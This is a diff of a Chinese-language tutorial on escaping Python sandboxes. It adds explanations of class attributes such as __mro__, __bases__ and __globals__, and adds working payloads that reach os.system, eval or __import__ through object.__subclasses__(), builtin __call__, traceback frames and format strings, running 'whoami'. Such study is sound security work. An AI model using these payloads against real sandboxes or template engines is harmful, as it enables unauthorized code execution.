@@ -312,7 +312,17 @@ del __builtins__.__dict__['eval']
 (<class 'str'>, <class 'object'>)
 ```
 
-类的实例在获取 `__class__` 属性时会指向该实例对应的类。可以看到，`''`属于 `str `类，它继承了 `object` 类，这个类是所有类的超类。具有相同功能的还有 `__base__` 和 `__bases__` 。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：
+> 类的实例在获取 `__class__` 属性时会指向该实例对应的类。
+
+可以看到，`''`属于 `str `类，它继承了 `object` 类，这个类是所有类的超类。具有相同功能的还有 `__base__` 和 `__bases__` 。
+
+> mro、base、bases 的区别在什么地方？
+>
+> - bases 输出父类类型的元组
+> - base 输出基类，也就是第一个继承的父类
+> - mro 返回类的层次结果
+
+- 需要注意的是，**经典**类需要指明继承 object 才会继承它，否则是不会继承的：
 
 ```python
 >>> class test:
@@ -339,7 +349,9 @@ del __builtins__.__dict__['eval']
 <module 'os' from '/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py'>
 ```
 
-怎么理解这个 `__globals__` 呢？它是函数所在的全局命名空间中所定义的全局变量。也就是只要是函数就会有这个属性。除了 `builtin_function_or_method` 或者是 `wrapper_descriptor` 、`method-wrapper` 类型的函数，例如 `range`、`range.__init__`、`''.split` 等等。
+怎么理解这个 `__globals__` 呢？它是**函数所在的全局命名空间中所定义的全局变量**。也就是只要是函数就会有这个属性，除了 `builtin_function_or_method` 或者是 `wrapper_descriptor` 、`method-wrapper` 类型的函数，例如 `range`、`range.__init__`、`''.split` 等等。
+
+- **\_\_globals\_\_ 会返回一个字典。**
 
 那么也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 `import site`。可以利用 `reload`，变相加载 `os`：
 
@@ -360,85 +372,10 @@ macr0phag3
 ```python
 >>> for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i
 ...
-(0, <type 'type'>)
-(1, <type 'weakref'>)
-(2, <type 'weakcallableproxy'>)
-(3, <type 'weakproxy'>)
-(4, <type 'int'>)
-(5, <type 'basestring'>)
-(6, <type 'bytearray'>)
-(7, <type 'list'>)
-(8, <type 'NoneType'>)
-(9, <type 'NotImplementedType'>)
-(10, <type 'traceback'>)
-(11, <type 'super'>)
-(12, <type 'xrange'>)
-(13, <type 'dict'>)
-(14, <type 'set'>)
-(15, <type 'slice'>)
-(16, <type 'staticmethod'>)
-(17, <type 'complex'>)
-(18, <type 'float'>)
-(19, <type 'buffer'>)
-(20, <type 'long'>)
-(21, <type 'frozenset'>)
-(22, <type 'property'>)
-(23, <type 'memoryview'>)
-(24, <type 'tuple'>)
-(25, <type 'enumerate'>)
-(26, <type 'reversed'>)
-(27, <type 'code'>)
-(28, <type 'frame'>)
-(29, <type 'builtin_function_or_method'>)
-(30, <type 'instancemethod'>)
-(31, <type 'function'>)
-(32, <type 'classobj'>)
-(33, <type 'dictproxy'>)
-(34, <type 'generator'>)
-(35, <type 'getset_descriptor'>)
-(36, <type 'wrapper_descriptor'>)
-(37, <type 'instance'>)
-(38, <type 'ellipsis'>)
-(39, <type 'member_descriptor'>)
-(40, <type 'file'>)
-(41, <type 'PyCapsule'>)
-(42, <type 'cell'>)
-(43, <type 'callable-iterator'>)
-(44, <type 'iterator'>)
-(45, <type 'sys.long_info'>)
-(46, <type 'sys.float_info'>)
-(47, <type 'EncodingMap'>)
-(48, <type 'fieldnameiterator'>)
-(49, <type 'formatteriterator'>)
-(50, <type 'sys.version_info'>)
-(51, <type 'sys.flags'>)
-(52, <type 'exceptions.BaseException'>)
-(53, <type 'module'>)
-(54, <type 'imp.NullImporter'>)
-(55, <type 'zipimport.zipimporter'>)
-(56, <type 'posix.stat_result'>)
-(57, <type 'posix.statvfs_result'>)
-(58, <class 'warnings.WarningMessage'>)
-(59, <class 'warnings.catch_warnings'>)
-(60, <class '_weakrefset._IterationGuard'>)
-(61, <class '_weakrefset.WeakSet'>)
-(62, <class '_abcoll.Hashable'>)
-(63, <type 'classmethod'>)
-(64, <class '_abcoll.Iterable'>)
-(65, <class '_abcoll.Sized'>)
-(66, <class '_abcoll.Container'>)
-(67, <class '_abcoll.Callable'>)
-(68, <type 'dict_keys'>)
-(69, <type 'dict_items'>)
-(70, <type 'dict_values'>)
+...
+...
 (71, <class 'site._Printer'>)
-(72, <class 'site._Helper'>)
-(73, <type '_sre.SRE_Pattern'>)
-(74, <type '_sre.SRE_Match'>)
-(75, <type '_sre.SRE_Scanner'>)
-(76, <class 'site.Quitter'>)
-(77, <class 'codecs.IncrementalEncoder'>)
-(78, <class 'codecs.IncrementalDecoder'>)
+
 ```
 
 可以看到，site 就在里面，以 2.x 的`site._Printer`为例（ py3.x 中已经移除了这里 `__globals__` 的 `os`）：
@@ -517,3 +454,81 @@ set.mro()[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')
 ```
 
 顺便提一下，`object` 本来就是可以使用的，如果没过滤的话，payload 可以再简化为：
+
+```python
+object.__subclasses__()[133].__init__.__globals__['system']('whoami')
+# object 表示 <class 'object'>
+# object.__subclasses__() 表示获取 object 类的所有子类，会返回一个由子类构成的列表。subclasses 是一个用于获取子类的方法！
+# object.__subclasses__()[133] 表示获取第 134 个 子类，也就是一个 class。
+
+# object.__subclasses__()[133].__init__ 会返回某类的包装器 wrapper，现在我也还不太明白....
+
+
+
+```
+
+还有一种是利用`builtin_function_or_method` 的 `__call__`：
+
+```python
+"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval, '1+1')
+```
+
+或者简单一点：
+
+```python
+[].pop.__class__.__call__(eval, '1+1')
+```
+
+上面这些 payload 大多数是直接 index 了，但是直接用 index 不太健壮，可以都换成列表推导式，用 `__name__` 来获取想要的 class，上面也举了好几个例子了，这里就不多说啦。
+
+最后再补充几个。
+
+可以这样利用：
+
+```python
+class test(dict):
+    def __init__(self):
+        print(super(test, self).keys.__class__.__call__(eval, '1+1'))
+        # 如果是 3.x 的话可以简写为：
+        # super().keys.__class__.__call__(eval, '1+1'))
+test()
+```
+
+还可以利用异常逃逸：
+
+```python
+hack = lambda : [0][1]
+try:
+    hack()
+except Exception as e:
+    e.__traceback__.tb_next.tb_frame.f_globals['__builtins__']['__import__']('os').system('whoami')
+```
+
+还可以利用 `format`：
+
+```python
+"{0.__class__.__base__}".format([])
+# 上述命令等价于 [].__class__.__base__
+```
+
+
+
+```python
+"{x.__class__.__base__}".format(x=[])
+"{.__class__.__base__}".format([])
+("{0.__class_"+"_.__base__}").format([])
+```
+
+（这里顺手记录下，对于字典键是整数型的比如 `{"1":2}`，format 是无法拿到值的 :)，这样会报错：
+
+```python
+''' {0['1']} '''.format({"1":2})
+```
+
+`'1'` 引号去掉的话又会报没有这个键，这个特性可以见[文档](https://docs.python.org/3/library/string.html#format-string-syntax)）
+
+上面的这些利用方式总结起来就是通过 `.mro()`、`__class__`、`type(...)`、`__mro__`、`__subclasses__`、`__base__`、`__bases__` 等属性/方法去获取 `object`，再根据`__globals__`找引入的`__builtins__`或者`eval`等等能够直接被利用的库，或者找到`builtin_function_or_method`类/类型`__call__`后直接运行`eval`。
+
+最后，其实沙箱逃逸，对于不同的第三方库可能会存在一些特殊的利用方式，比如 `jinja2`，这类属于 `SSTI` 漏洞，可以看这个：[传送门🚪](https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/)，这里就不多说了。
+
+其实 SSTI 也会用到这里的很多技巧，两者知识面相互交叠。
